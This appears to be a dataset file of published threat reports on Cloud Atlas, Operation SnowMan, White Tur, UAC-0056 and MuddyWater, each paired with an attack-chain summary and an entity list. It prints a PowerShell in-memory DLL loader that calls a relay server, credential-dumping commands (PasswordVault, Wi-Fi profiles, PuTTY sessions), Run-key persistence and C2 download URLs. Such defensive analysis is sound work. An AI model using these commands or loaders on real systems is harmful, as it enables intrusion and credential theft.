[System.Convert]::FromBase64String($dll_compressed_base64) $ms=New- ObjectSystem.IO.MemoryStream(,$dll_compressed) $cs=New- ObjectSystem.IO.Compression.GzipStream($ms,[IO.Compression.CompressionMode]::Decompress) $br=New-ObjectSystem.IO.BinaryReader($cs) $dll_content=$br.ReadBytes(10485760) $br.Close() $cs.Close() $ms.Close() [System.Reflection.Assembly]::Load($dll_content) #$content_bytes= [tcp_ssl_simple.NetTcpSsl]::StartHello() #[abcd.Service]::StartHello() // Prototype: // StartMainXor(string host, string port, int number, int reconnect_sleep, int time_stop_delay_seconds, string hexkey) $content_bytes=[abcd.Service]::StartMainXor(""<server_address>"", ""11171"", 10, 7000, 15 * 60, ""010203BADC0DEF"") write-host""DoneTest"" $dll_compressed_base64=""H4sIAAAAAAA<truncated>"" $dll_compressed=[System.Convert]::FromBase64String($dll_compressed_base64) $ms=New-ObjectSystem.IO.MemoryStream(,$dll_compressed) $cs=New-ObjectSystem.IO.Compression.GzipStream($ms, [IO.Compression.CompressionMode]::Decompress) $br=New-ObjectSystem.IO.BinaryReader($cs) $dll_content=$br.ReadBytes(10485760) [System.Reflection.Assembly]::Load($dll_content) #$content_bytes=[tcp_ssl_simple.NetTcpSsl]::StartHello() #[abcd.Service]::StartHello() // Prototype: // StartMainXor(string host, string port, int number, int reconnect_sleep, int time_stop_delay_seconds, string hexkey) $content_bytes=[abcd.Service]::StartMainXor(""<server_address>"", ""11171"", 10, 7000, 15 * 60, ""010203BADC0DEF"") write-host""DoneTest"" This DLL is internally called rtcpsvc.dll and is responsible for relaying commands between two different servers. This DLL is likely a part of a sequence of proxies used by the attackers. There were multiple past reports that the actors heavily relied on a world-wide proxy network, however, it was never mentioned that they achieved this with DLLs on Windows. Setting proxies within compromised environments might also in some cases allow the actors to penetrate high profile targets while reducing the risk of their network activity being discovered or blocked, as the network activity is associated with trusted sources inside the country or industry.The communication between the DLL and the hosts can be XOR-encrypted, depending on if the DLL was executed with a key parameter or without. In all the cases we analyzed, the same key “010203BADC0DEF” was used for the XOR-encryption. Other parameters that are provided to launch the DLL include the host and port of the remote peer, the number of connections, and the amount of time to sleep before reconnecting.8/16Figure 7 – Overview of theCommunication class responsible for communication between two peers.The DLL reaches out to the specified remote host (Left) and receives 4 bytes in response. These bytes specify the length of the next message (command) to be received. It then connects again to the host and expects an XML response with the connect command. This XML response should contain the host and port of another (Right) peer. The DLL connects to the second host as well, notifies the first host of success, and starts to relay messages between them.9/16Figure 8 – Function responsible for sending the connect result in XML format to the “Left” peer.Similar to the command execution status sent to the peers, the relayed messages themselves are also in XML format, as well as the commands received by the PowerShower backdoor. Modular espionage frameworkInterestingly, the actors made no significant changes in the core of their modular backdoor in the seven years after its discovery in 2014 by Kaspersky and Symantec. As described in the aforementioned reports, we observed multiple samples of Cloud Atlas’ modular backdoor. Each is an obfuscated DLL accompanied by an encrypted file, with both DLL and data files named using random words. For example, a DLL named beachmaster.dll was accompanied by an encrypted file named examinere. Each DLL has multiple randomly-named export functions, only one of which is relevant. When the relevant export function is called, the DLL begins to decrypt and load an embedded PE file. The loaded PE file then XOR-decrypts a hardcoded struct that instructs it how to decrypt the companion file. For example, the hardcoded struct in the PE inside beachmaster.dll will look like this:0000h: C6 8E CA BF E5 DE 8E 74 1E 08 E3 FB 6D C1 79 3F ÆŽÊ¿åÞŽt ãûmÁy?0010h: E5 19 69 0C 55 74 54 F7 CF 15 9D AF 00 02 D9 55 å.i.UtT÷Ï.�¯ ÙU0020h: 47 00 6C 00 6F 00 62 00 61 00 6C 00 5C 00 49 00 G.l.o.b.a.l.\.I.0030h: 54 00 4F 00 4A 00 75 00 43 00 65 00 69 00 00 00 T.O.J.u.C.e.i 0040h: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 […truncated…]0090h: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00A0h: 65 00 78 00 61 00 6D 00 69 00 6E 00 65 00 72 00 e.x.a.m.i.n.e.r.00B0h: 65 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e 10/1600C0h: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 […truncated…]0110h: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0120h: 7D CB BE 31 61 A3 10 54 8F D7 31 71 5E E7 21 86 }Ë¾1a£.T�×1q^ç!†0130h: 13 E1 CF 96 .áÏ– 0000h: C6 8E CA BF E5 DE 8E 74 1E 08 E3 FB 6D C1 79 3F ÆŽÊ¿åÞŽt ãûmÁy? 0010h: E5 19 69 0C 55 74 54 F7 CF 15 9D AF 00 02 D9 55 å.i.UtT÷Ï.�¯ ÙU 0020h: 47 00 6C 00 6F 00 62 00 61 00 6C 00 5C 00 49 00 G.l.o.b.a.l.\.I. 0030h: 54 00 4F 00 4A 00 75 00 43 00 65 00 69 00 00 00 T.O.J.u.C.e.i 0040h: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 […truncated…] 0090h: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00A0h: 65 00 78 00 61 00 6D 00 69 00 6E 00 65 00 72 00 e.x.a.m.i.n.e.r. 00B0h: 65 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e 00C0h: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 […truncated…] 0110h: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0120h: 7D CB BE 31 61 A3 10 54 8F D7 31 71 5E E7 21 86 } Ë¾1a£.T�×1q^ç!† 0130h: 13 E1 CF 96 .áÏ– 0000h: C6 8E CA BF E5 DE 8E 74 1E 08 E3 FB 6D C1 79 3F ÆŽÊ¿åÞŽt ãûmÁy? 0010h: E5 19 69 0C 55 74 54 F7 CF 15 9D AF 00 02 D9 55 å.i.UtT÷Ï.�¯ ÙU 0020h: 47 00 6C 00 6F 00 62 00 61 00 6C 00 5C 00 49 00 G.l.o.b.a.l.\.I. 0030h: 54 00 4F 00 4A 00 75 00 43 00 65 00 69 00 00 00 T.O.J.u.C.e.i 0040h: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 […truncated…] 0090h: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00A0h: 65 00 78 00 61 00 6D 00 69 00 6E 00 65 00 72 00 e.x.a.m.i.n.e.r. 00B0h: 65 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e 00C0h: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 […truncated…] 0110h: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0120h: 7D CB BE 31 61 A3 10 54 8F D7 31 71 5E E7 21 86 }Ë¾1a£.T�×1q^ç!† 0130h: 13 E1 CF 96 .áÏ– The structure is built from an AES256 key which is used to decrypt the companion file, an event name which prevents running multiple instances of malware, a file name of the encrypted companion file, and a SHA1 hash. The SHA1 at the end of the structure is used for a hash check: it matches the calculated SHA1 hash of the first 0x120 bytes of the configuration.The payload then decrypts the companion file. It uses the AES256 key from the config, and the last 16 bytes from the companion file as an IV. It then uses LZNT1 to decompress the results and reveal another PE file. The newly revealed DLL also has an encrypted configuration hardcoded inside. Its decryption11/16process is similar to those seen in previous stages and this config provides information that instructs the malware how to communicate with its C&C server.The malware still lives up to its “cloud name” origins and uses cloud storage providers to communicate via WebDAV protocol. In the samples we observed, Cloud Atlas used OpenDrive as its service of choice. The credentials for OpenDrive are hardcoded in the encrypted configuration, along with two URIs (one for uploading files from the victim, one for downloading files from the server) and the pattern and extensions to generate the names of the uploaded files. The data sent to the service, such as information about the environment of the victim, is saved as files under the URI specified in the configuration. Additionally, the payload connects to another URI to receive the next payload, and when it downloads the next payload, it issues a request to the server to remove the downloaded file. The first module which is sent automatically is the stealer module, which is responsible for collecting the login and cookie data from multiple browsers on the victim’s machine. Incident response reportWhile investigating CloudAtlas activity, we stumbled upon some type of incident response report written in Russian that was uploaded to VirusTotal from an IP address located in Donetsk. This report (no TLP label specified) provides an analysis of a few successful intrusions that occurred in June. These intrusions were discovered only in the later stages when the attackers already had full access to the entire network including the domain controller. Although not all the information in the report is precise and well-detailed, we can cautiously extract some of the group’s additional TTPs during the later stages of the attack:After gaining access to the domain controller, the actors extract the snapshot of its database using the ntdsutil utility and copy it to their server for offline analysis and extraction of password hashes. To connect to the machines inside the victim organization’s network, the attackers use the infected computers of ordinary users, from which they then connect via RDP to the domain controller. The attackers use existing domain accounts after changing their permissions or create accounts with similar names by changing one or two letters. The actors conduct their primary activities (using RDP or ssh to other servers, endpoints or network equipment) from the domain controller, impersonating regular sysadmin operations. Additional tools used by the attackers include Advanced Port Scanner (version 2.5.3869, with Russian interface), file manager Far, Chocolatey, AnyDesk, and Putty (copied to the servers and deleted after completing the task). The actors also use Python 3 scripts on multiple servers to perform a variety of operations such as: searching and deleting all information about connections to webdav.opendrive.com from the logs of the Squid proxy server; copying correspondence from Telegram clients, saved passwords and browser history; and brute force of Microtik routers.It is not clear from the report which organizations or entities were the victims of these attacks. ConclusionCloud Atlas continuously and persistently targets entities of interest. With the escalation of the conflict between Russia and Ukraine, their focus for the past year has been on Russia and Belarus and their diplomatic, government, energy and technology sectors, and on the annexed regions of Ukraine.12/16Cloud Atlas continues to use the simple but effective method of social engineering, using spear-phishing emails to compromise their targets. In the first stage of the attack, the actors use Word documents with remote templates, usually whitelisted for a particular target, which makes the phishing documents almost undetectable. Judging by the fact that the group continues to be very active despite only minor changes in TTPs, their methods seem to be successful. Not only do they manage to penetrate their targets and expand their initial access to the entire domain, but they can also use them as proxies for other operations.Harmony Email & Office deploys between the inbox and its native security. The solution secures inbound, outbound, and internal email from phishing attacks that evade platform-provided solutions and email gateways. It works with these other solutions and doesn’t require any MX record changes that broadcast security protocols to hackers.Check Point’s Threat Emulation protects networks against unknown threats in web downloads and e-mail attachments. The Threat Emulation engine picks up malware at the initial phase, before it enters the network. The engine quickly quarantines and runs the files in a virtual sandbox environment, which imitates a standard operating system, to discover malicious behavior at the exploit phase. "," 1. The group sends spearphishing emails with weaponized Office documents containing malicious templates that exploit Equation Editor vulnerabilities. 2. If successfully exploited, the documents install a Powershell backdoor called PowerShower. 3. PowerShower connects to command and control servers to receive additional payloads. 4. One payload is a .NET proxy tool that relays commands between servers. 5. Another payload is a modular espionage framework that uses encrypted configurations and cloud storage for command and control. It collects data from the victim's machine. 6. The attackers use the compromised machines to move laterally in the network, gain domain admin access, and extract password hashes from the domain controller. 7. They impersonate privileged accounts and sysadmin activities to further access servers, endpoints and network devices. 8. Additional tools are used for discovery, lateral movement, and data exfiltration. ",valid_23,"['the group', 'PE', 'Office', 'success', 'Powershell', 'PowerShower', 'servers', 'commands', 'Modular espionage', 'cloud storage', 'data', 'the victim', 'the attackers', 'the network', 'access', 'password hashes', 'the domain controller', 'accounts', 'endpoints', 'Additional tools', 'discovery']",the group; PE; Office; success; Powershell; PowerShower; servers; commands; Modular espionage; cloud storage; data; the victim; the attackers; the network; access; password hashes; the domain controller; accounts; endpoints; Additional tools; discovery.
"Operation SnowMan: DeputyDog Actor Compromises US Veterans of Foreign Wars WebsiteOn February 11, FireEye identified a zero-day exploit (CVE-2014-0322) being served up from the U.S. Veterans of Foreign Wars’ website (vfw[.]org). We believe the attack is a strategic Web compromise targeting American military personnel amid a paralyzing snowstorm at the U.S. Capitol in the days leading up to the Presidents Day holiday weekend. Based on infrastructure overlaps and tradecraft similarities, we believe the actors behind this campaign are associated with two previously identified campaigns (Operation DeputyDog and Operation Ephemeral Hydra).This blog post examines the vulnerability and associated attacks, which we have dubbed “Operation SnowMan.”Exploit/Delivery analysisAfter compromising the VFW website, the attackers added an iframe into the beginning of the website’s HTML code that loads the attacker’s page in the background. The attacker’s HTML/JavaScript page runs a Flash object, which orchestrates the remainder of the exploit. The exploit includes calling back to the IE 10 vulnerability trigger, which is embedded in the JavaScript. Specifically, visitors to the VFW website were silently redirected through an iframe to the exploit at www.[REDACTED].com/Data/img/img.html.MitigationThe exploit targets IE 10 with Adobe Flash. It aborts exploitation if the user is browsing with a different version of IE or has installed Microsoft’s Experience Mitigation Toolkit (EMET). So installing EMET or updating to IE 11 prevents this exploit from functioning.Vulnerability analysisThe vulnerability is a previously unknown use-after-free bug in Microsoft Internet Explorer 10. The vulnerability allows the attacker to modify one byte of memory at an arbitrary address. The attacker uses the vulnerability to do the following:Gain access to memory from Flash ActionScript, bypassing address space layout randomization (ASLR) Pivot to a return-oriented programing (ROP) exploit technique to bypass data execution prevention (DEP)EMET detectionThe attacker uses the Microsoft.XMLDOM ActiveX control to load a one-line XML string containing a file path to the EMET DLL. Then the exploit code parses the error resulting from the XML load order to determine whether the load failed because the EMET DLL is not present. The exploit proceeds only if this check determines that the EMET DLL is not present.ASLR bypassBecause the vulnerability allows attackers to modify memory to an arbitrary address, the attacker can use it to bypass ASLR. For example, the attacker corrupts a Flash Vector object and then accesses the corrupted object from within Flash to access memory. We have discussed this technique and other ASLR bypass approaches in our blog. One minor difference between the previous approaches and this attack is the heap spray address, which was changed to 0x1a1b2000 in this exploit.Code executionOnce the attacker’s code has full memory access through the corrupted Flash Vector object, the code searches through loaded libraries gadgets by machine code. The attacker then overwrites the vftable pointer of a flash.Media.Sound() object in memory to point to the pivot and begin ROP. After successful exploitation, the code repairs the corrupted Flash Vector and flash.Media.Sound to continue execution.Shellcode analysisSubsequently, the malicious Flash code downloads a file containing the dropped malware payload. The beginning of the file is a JPG image; the end of the file (offset 36321) is the payload, encoded with an XOR key of 0×95. The attacker appends the payload to the shellcode before pivoting to code control. Then, when the shellcode is executed, the malware creates files “sqlrenew.txt” and “stream.exe”. The tail of the image file is decoded, and written to these files. “sqlrenew.txt” is then executed with the LoadLibraryA Windows API call.ZxShell payload analysisAs documented above, this exploit dropped an XOR (0×95) payload that executed a ZxShell backdoor last modified date of the exploit code was also 2014-02-11. This suggests that this instantiation of the exploit was very recent and was deployed for this specific strategic Web compromise of the Veterans of Foreign Wars website. A possible objective in the SnowMan attack is targeting military service members to steal military intelligence. In addition to retirees, active military personnel use the VFW website. It is probably no coincidence that Monday, Feb. 17, is a U.S. holiday, and much of the U.S. Capitol shut downThursday amid a severe winter storm.The ZxShell backdoor is a widely used and publicly available tool used by multiple threat actors linked to cyber espionage operations. This particular variant called back to a command and control server located at resolved to this IP address on 2014-02-12.Infrastructure analysisThe info[.]flnet[.]org domain overlaps with icybin[.]flnet[.]org and book[.]flnet[.]org via the previous 2013-08-31 2013-05-02 2013-08-02 2013-08-10 2013-07-15 2014-01-02 2013-12-03Last Seen 2013-08-31 2013-08-02 2013-08-02 2013-08-10 2013-07-15 2014-01-02 2014-01-02IPCnC Domain info.flnet[.]org book.flnet[.]org info.flnet[.]org book.flnet[.]org info.flnet[.]org book[.]flnet[.]org and icybin[.]flnet[.]org. The threat actor responsible for Operation DeputyDog also used the “HTTPS” version of the Gh0st. We also observed another “HTTPS” Gh0st variant connecting to a related command and control server at me[.]scieron[.]com.MD5 Hash 2012-04-09 2012-04-09 2012-11-08 2012-11-23 2012-05-292012-11-28 2012-10-24 2012-09-18 2012-11-25 2012-11-27 dll.freshdns[.]org book.flnet[.]orgA number of other related domains resolve to these IPs and other IPs also in this /24 subnet. For the purposes of this blog, we’ve chosen to focus on those domains and IP that relate to the previously discussed DeputyDog and Ephemeral Hydra campaigns.You may recall that dll[.]freshdns[.]org, ali[.]blankchair[.]com and cht[.]blankchair[.]com were all linked to both Operation DeputyDog and Operation Ephemeral Hydra. Figure 1 illustrates the infrastructure overlaps and connections we observed between the strategic Web compromise campaign leveraging the VFW’s website, the DeputyDog, and the Ephemeral Hydra operations.Figure 1: Ties between Operation SnowMan, DeputyDog, and Ephemeral HydraLinks to DeputyDog and Ephemeral HydraOther tradecraft similarities between the actor(s) responsible for this campaign and the actor(s) responsible for the DeputyDog/Ephemeral Hydra campaigns include:The use of zero-day exploits to deliver a remote access Trojan (RAT) The use of strategic web compromise as a vector to distribute remote access Trojans The use of a simple single-byte XOR encoded (0×95) payload obfuscated with a .jpg extension The use of Gh0stRat with the “HTTPS” packet flag The use of related command-and-control (CnC) infrastructure during the similar time framesWe observed many similarities from the exploitation side as well. At a high level, this attack and the CVE- 2013-3163 attack both leveraged a Flash file that orchestrated the exploit, and would call back into IE JavaScript to trigger an IE flaw. The code within the Flash files from each attack are extremely similar.They build ROP chains and shellcode the same way, both choose to corrupt a Flash Vector object, have some identical functions with common typos, and even share the same name.ConclusionThese actors have previously targeted a number of different industries, including:U.S. government entities Japanese firms Defense industrial base (DIB) companies Law firms Information technology (IT) companies Mining companies Non-governmental organizations (NGOs)The proven ability to successfully deploy a number of different private and public RATs using zero-day exploits against high-profile targets likely indicates that this actor(s) will continue to operate in the mid to long-term.This entry was posted in Advanced Malware, Exploits, Targeted Attack, Threat Research, Vulnerabilities and tagged 0day, zero-day by Darien Kindlund, Dan Caselden, Xiaobo Chen, Ned Moran and Mike Scott. Bookmark the permalink. ", 1. Attackers compromise the VFW website and add malicious iframe code. 2. The iframe silently redirects visitors to an exploit server hosting the IE 10 exploit. 3. The exploit bypasses EMET and ASLR protections in IE 10. 4. The exploit achieves remote code execution and drops a malware payload encoded as a JPEG image. 5. The payload extracts and executes the ZxShell backdoor. 6. ZxShell connects to a command and control server linked to previous attacks by this threat actor. ,valid_44,"['attackers', 'the VFW website', 'US', 'visitors', 'IE 10', 'the exploit', 'EMET', 'ASLR', 'execution', 'ROP', 'the payload', 'the ZxShell backdoor', 'a command and control server']",attackers; the VFW website; US; visitors; IE 10; the exploit; EMET; ASLR; execution; ROP; the payload; the ZxShell backdoor; a command and control server.
"www.pwc.com /gx/en/issues/cybersecurity/cyber-threat-intelligence/threat-actor-of-in-tur-est.html Threat actor of in-Tur-estBy Jack Simpson, Cyber Threat Intelligence, PwCIn January 2021, PwC observed a phishing page that prompted an investigation into a new threat actor we now call ‘White Tur’. Per our in-house naming convention for threat actors, the use of the colour 'White' indicates that we have not yet formally attributed White Tur as being based in a specific geographic location.Our journey began when hunting for newly registered domains with TLS certificates that use the term ‘qov’, spoofing the legitimate term ‘gov’. Spoofing the word ‘gov’ has previously been a favoured technique of several unrelated threat actors, such as Blue Athena (a.k.a. Sofacy, APT28)1. On 31st January 2021, we observed the subdomain mail[.]mod[.]qov[.]rs being used to phish for Serbian Ministry of Defence credentials. The phishing page shown in Figure 1 when visited not only logged credentials, but logged visits to the phishing page itself.Figure 1 - Serbian Ministry of Defence phishing page mail[.]mod[.]qov[.]rsWhen tracking domain registrations and domain resolutions to White Tur attributed infrastructure, we observed it to be a persistent threat actor operating over a number of years, from at least 2017 through to 2021, as shown in Figure 2.1/6Figure 2 - Timeline of domain registration and domain resolution activity by White TurThe techniques used by White Tur included:Weaponised documents - Ranging from documents containing macros to exploits such as CVE-2017-0199; HTA scripts - Scripts that lead to the execution of PowerShell were often observed being used as an alternative to weaponised documents as an initial infection vector; XSL Scripts - Used inside weaponised documents to execute a payload. From our observations the XSL scripts can be used to execute a JScript or Windows binary backdoor; PowerShell Scripts - Part of the infection chain to download and execute the final payload; JScript - One of the backdoors used by White Tur was developed in JScript (One of the interpreted languages used in Windows Script Host); Windows binaries - Another backdoor used by White Tur was packaged as a Windows binary; and, Phishing - Phishing activity with governmental, defence, research and development and telecommunications themes.This blog is focused on our analysis of White Tur’s use of the open-source project OpenHardwareMonitor for payload execution. This project monitors temperature sensors, fan speeds, voltage and load and clock speeds of a computer2. We observed an archive named OpenHardwareMonitor-revised.zip with patterns we commonly associate with White Tur.Filename File sizeOpenHardwareMonitor-revised.zip 2,810,227 bytesFirst Observed 2021-05-26 17:50:34 AnalysisAfter analysing the contents of the ZIP file, we assessed that White Tur was likely packaging the OpenHardwareMonitor project and backdooring parts of it to execute its payloads. There were three files that White downloOpenHardwareMonitorLib.csprojIn the file OpenHardwareMonitorLib.csproj, White Tur modified the file to inject PowerShell code into the pre-build event, available in Visual Studio projects. This technique for gaining execution was discussed by Microsoft in January 2021, when they observed the North Korea-based threat actor ZINC (which we track as Black Artemis) using this method3. The PowerShell code retrieves environmental information from the victim using PowerShell WMI objects and utilises the BitsTransfer Module available in PowerShell to download a payload shown in Figure 3. The payload is downloaded and copied to \APPDATA\Local\Microsoft\OneDrive\WOFUTIL.dll - this filename has been observed in previous White Tur activity.4Figure 3 - PowerShell code contained in the PreBuildEvent tagThe PowerShell script will generate a unique ID for the infected machine and name it a ‘UUID’. This unique identifier is sent to the C2 when the payload is downloaded through the URL:hxxp[:]//onedrive-login[.]us/download.php?uuid=<unique_ID>CWRITE.ps1CWRITE.ps1 is a PowerShell downloader script; however, unlike the prebuild event, it uses a different technique for C2 communication and logs environmental information to a separate IP. The PowerShell script sends environmental information to the following URL via BitsTransfer:hxxp[:]//193.37.213[.]135/BitsData/The PowerShell script will then download the payload to the same folder via the same URL as the previous script:hxxp[:]//onedrive-login[.]us/download.php?uuid=<unique_ID>However, its method for communication has been modified; in this sample, the PowerShell script initiates a COM object, specifically XML HTTP 3.05. The script uses the .Open() method to send a HTTP request shown in Figure 4.Figure 4 - Payload being downloaded using XML HTTP 3.0 COM object in PowerShellCommand.dat3/6The binary command.dat is a DLL that contains exports previously observed in White Tur payloads. These exports GetTeamViewerInterface.The payload correctly functions by executing the default DLL entry point, DllEntrypoint. PwC assesses White Tur likely uses the name WOFUTIL.dll for payloads in a DLL search order hijacking attack. The Windows binary OneDriveStandAloneUpdater.exe is vulnerable to DLL side order hijacking and loads the DLL WOFUTIL.dll6. The DLL also makes use of the BitsTransfer COM objects, it calls CoCreateInstance with class identifiers (CLSIDs) related to the BitsTransfer control class shown in Figure 5.Figure 5 - Malware utilising BitsTransfer control class COM objectsLike the PowerShell scripts, the Windows binary will generate a unique identifier for the victim. This is achieved by dynamically loading the library RPCRT4.dll and calling UuidCreateSequential(). The malware will use the following URL with the BitsTransfer COM object for C2 communication:hxxp[:]//onedrive-login[.]us/tp/reply.phpFrom our observations, this is the most functional backdoor we have observed from White Tur which is capable of:File management; Upload and download of files; Execution of commands; and, Set malware sleep time.However, White Tur has been experimenting with malware development and open-source projects. For example, we identify an open-source malware project name present on the command.dat PDB path. “Storm Kitty” is an open- source C# stealer used to capture credentials and keylogs by the victim.C:\Users\tensho\Desktop\StormKitty-master\Cameleon\Release\Cameleon.pdbThis threat actor uses several techniques often observed by a wide variety of threats actors, such as DLL search order hijacking, phishing and use of COM objects. The unique feature this threat actor has is its victimology, targeting defence, governmental and research organisations based in Serbia and Republika Srpska. The full infection chain we observed with this technique is shown in Figure 6.Figure 6 - Part of the infection chain used by White Tur Attribution4/6We are still in the technical phases of attribution with this threat actor; if we refer to the 4C model7 of attribution phases we are currently at the clustering phase. With some threat actors it is clear there are links to other APTs. However, from our assessment, this particular threat actor has a range of motivations with no clear links to well- known threat actors which are attributed to a government or organisation.The threat actor focuses attacks on a region where there is little coverage in threat intelligence blogs, in this blog we aim to encourage some public dialogue about who would want to backdoor OpenHardwareMonitor and target these regions? This blog complements a talk presented at the SANS CTI Summit on 27th January 2021, which explores the Footnotes[1] ‘APT28: A Window into Russia’s Cyber Espionage Operations?’, FireEye, url (5th February 2010)[2] 'Open Hardware Monitor - Core temp, fan speed and voltages in a free software gadget', OpenHardwareMonitor, url (n.d)[3] ‘ZINC attacks against security researchers’, Microsoft, url attacks-against-security-researchers/ (28th January 2021)[4] CTO-TIB-20210903-01A - Darth Vladars under attack Part 3[5] ‘MSXML 3.0 GUIDs and ProgIDs’, Microsoft, url versions/windows/desktop/ms766426(v=vs.85) (27th October 2018)[6] ‘Hunting for Evidence of DLL Side-Loading With PowerShell and Sysmon’, SecurityIntelligence, url (18th August 2021)[7] 'Attribution of Advanced Persistent Threats', Springer: Timo Steffens, 20th July 2020, url "," 1. White Tur sends phishing emails with weaponized documents, HTA or PowerShell scripts. 2. Scripts and macros in the documents retrieve and execute malware payloads. 3. One method injects PowerShell into a Visual Studio project file to download malware masked as a OneDrive DLL. 4. Another PowerShell script exfiltrates system info before downloading the malware payload. 5. A Windows binary backdoor payload carries out functions like command execution, file operations, and setting sleep times. ",valid_97,"['White Tur', 'phishing', 'documents', 'HTA', 'PowerShell scripts', 'macros', 'payloads', 'Visual Studio', 'download', 'OneDrive', 'DLL', 'The malware', 'a Windows binary', 'functions', 'COM', 'execution', 'Set']",White Tur; phishing; documents; HTA; PowerShell scripts; macros; payloads; Visual Studio; download; OneDrive; DLL; The malware; a Windows binary; functions; COM; execution; Set.
"www.sentinelone.com /blog/threat-actor-uac-0056-targeting-ukraine-with-fake-translation-software/ Threat Actor UAC-0056 Targeting Ukraine with Fake Translation Software ⋮ 3/15/2022OverviewSentinelOne has identified new malicious activity we assess to be closely associated with the UAC-0056 (SaintBear, UNC2589, TA471) alert, in which the threat actor was observed targeting Ukraine with Cobalt Strike, GrimPlant, and GraphSteel. This previously undiscovered set of activity centers around a Python-compiled binary that masquerades as Ukrainian language translation software, leading to the infection of GrimPlant, and GraphSteel.SentinelOne assesses UAC-0056’s GrimPlant and GraphSteel activity began in early February 2022, while preparation for its use began at least as early as December 2021. Dictionary TranslatorSentinelOne has identified two files with names and paths correlating to the GraphSteel and GrimPlant malware C:\Users\user\.java-sdk\oracle-java.exe (dictionary-translator.exe). Dictionary-translator is a Python compiled binary that functions as a 45 MB translation application. Notably, this file was first uploaded to VirusTotal on February 11th 2022.Translation Application1/3The Dictionary-translator binary is downloaded from the potentially actor-controlled domain: hxxps://dictionary-translator[.]eu/program/dictionary-translator.exe.On launch, the translator application drops and executes four malicious files. These correlate to those described in the report by the Ukrainian CERT, three by name and path and one by functionality and path.UA-CERT Report Link (MD5)Matched File Path \Users\user\.java-sdk\java-sdk.exe \Users\user\.java-sdk\microsoft-cortana.exe \Users\user\.java-sdk\oracle-java.exe Post-Compromise ActivityUpon execution, the GraphSteel variant of the malware will run a set of reconnaissance and credential harvesting commands, again similar to those described in the report. netsh wlan show profiles [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntim = New-Object Windows.Security.Credentials.PasswordVault;$vault.RetrieveAll() | % { $_.RetrievePassword();$_} | Select UserName, Resource, Password | Format-Table - reg query HKCU\Software\SimonTatham\Putty\SessionsAdditionally, the malware achieves persistence by setting the current user’s registry CurrentVersion\Run value to execute the Go downloader at logon: Key: HKU\%SID%\Software\Microsoft\Windows\CurrentVersion\Run\Java-SDK Value: \Users\user\.java-sdk\java-sdk.exe -a FIAjtW4f+IgCUrs3hfj9Lg==The variant discovered by SentinelOne attempts to connect to a different server using a similar pattern, attempting to Clarification on Threat Actor UAC-0056UAC-0056 has a history of public reporting but is most commonly known as UNC2589 (Mandiant) and TA471 (Proofpoint), among others. This actor is believed to be behind the WhisperGate activity in early January 2022 impacting government agencies in Ukraine. Based on our analysis, the actor was potentially building the infrastructure for the GrimPlant and GraphSteel campaign beginning in December 2021.Timeline Demonstrating Known UAC-0056 ActivityIndicators of CompromiseIOC / SHA1 dictionary-translator[.]eu 91.242.229[.]35:443/i Dictionary-translator.exe Download Server "," 1. The threat actor UAC-0056 registers the domain dictionary-translator[.]eu to host the malware. 2. The actor uploads the Python-compiled ""dictionary-translator.exe"" file to VirusTotal on February 11, 2022 to host it on the domain. 3. The malware is distributed to victims, likely through phishing or social engineering tactics. 4. Victims download and execute the fake translation software ""dictionary-translator.exe"". 5. The malware drops and executes four files matching those described in the Ukrainian CERT report. 6. The GraphSteel variant executes reconnaissance and credential harvesting commands. 7. GraphSteel achieves persistence by setting a Run registry key to execute its downloader at startup. 8. The malware attempts to connect to a C2 server to receive commands. 9. The threat actor likely uses access and data from the malware to enable further exploitation and cyber espionage activities. ",valid_46,"['the threat actor', 'uac-0056', 'the malware', 'the actor', 'Dictionary-translator.exe', 'VirusTotal', 'February', 'Fake Translation Software', 'four', 'the Ukrainian CERT', 'the GraphSteel variant', 'reconnaissance and credential harvesting commands', 'persistence', 'Run', 'key', 'C2']",the threat actor; uac-0056; the malware; the actor; Dictionary-translator.exe; VirusTotal; February; Fake Translation Software; four; the Ukrainian CERT; the GraphSteel variant; reconnaissance and credential harvesting commands; persistence; Run; key; C2.
"lab52.io /blog/muddywaters-light-first-stager-targetting-middle-east/ MuddyWater’s “light” first-stager targetting Middle East _thespis ⋮Since the last quarter of 2020 MuddyWater has mantained a “long-term” infection campaign targeting Middle East countries. We have gathered samples from November 2020 to January 2022, and due to the recent samples found, it seems that this campaign might still be currently active. The latest campaigns of the Muddy Water threat group, allegedly sponsored by the Iranian government and linked to the Iranian revolutionary guard (the main armed forces of the Iranian government), could be framed within the dynamics of maintaining Iran’s regional sovereignty.This infection campaign always starts with a compressed file wrapping a malicious Word document containing VBA macros.Malicious document sampleWhile our oldest sample looks a little more sophisticated based on the content of the document, which seems more specifically crafted for Arabic speakers as shown in the previous image, the rest of them contain generic English message to enable macros.Malicious document sample1/6Malicious document sampleAlthough it has not been possible to clearly identify their specific target, it has been observed that these campaigns have been directed against countries such as Pakistan, Kazahstan, Armenia, Syria, Israel, Bahrain, Turkey, South Africa, Sudan, etc. Many of these countries may be of interest to the alleged Iranian threat actor, as some of them have been involved in recent internal conflicts, or are implicated in nuclear energy improvement, or may serve as strategic footholds for the development and influence of Iranian interests in other parts of the world.The macros are very concise and their only purpose is to write a not-so-much obfuscated VBS script into a file located in C:\ProgramData or the Windows Startup folder, with names such as Temp_[3-5 random chars].txt.2/6Malicious VBA macro codeThe dropped script is a small RAT which allows to execute commands via cmd. It first calls a recon function which executes whoami, and sets a country code which is already present in the script. The result of this will then be part of the URI used for the C2 contact. The set of different country codes found in the gathered samples are the following, and might indeed reveal the targets for each campaign:PK –> Pakistan SA –> South Africa SD –> Sudan KK –> Kazakhstan3/6Code snippet from dropped VB Script (Deobfuscated)Code snippet from dropped VB Script (Obfuscated)After building the recon string, it will execute its main 